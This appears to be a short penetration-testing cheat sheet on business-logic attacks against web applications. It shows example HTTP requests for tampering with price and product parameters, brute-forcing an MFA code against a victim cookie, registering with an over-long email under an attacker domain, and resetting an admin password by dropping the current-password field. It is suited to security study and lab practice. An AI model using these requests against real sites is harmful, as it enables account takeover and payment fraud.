---
title: Business Logic Attack
desc: 
tags: [Burp, Business, Logic, Web]
alts: []
render_with_liquid: false
---

## 1. Change POST Params to Unexpected Values

```sh
productId=-1
productId=a
productId=1&price=-1000
```

<br />

## 2. Exploit Broken Two-Factor

1. **Brute force a MFA Code**

    ```html
    POST /login HTTP/1.1
    Cookie: verify=victim
    ...

    <!-- Brute force digits code -->
    mfa-code=1111
    ```

<br />

## 3. Loop Back with 2,147,483,647

Coming soon.

<br />

## 4. Register with Too Long-Length Email Address

```html
POST /register HTTP/1.1
...

username=attacker&password=pass1&email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com
```

<br />

## 5. Remove the Specific POST Params

```html
POST /change-password HTTP/1.1
...

<!-- Remove 'current-password' parameter -->
username=admin&new-password-1=newpass&new-password-2=newpass
```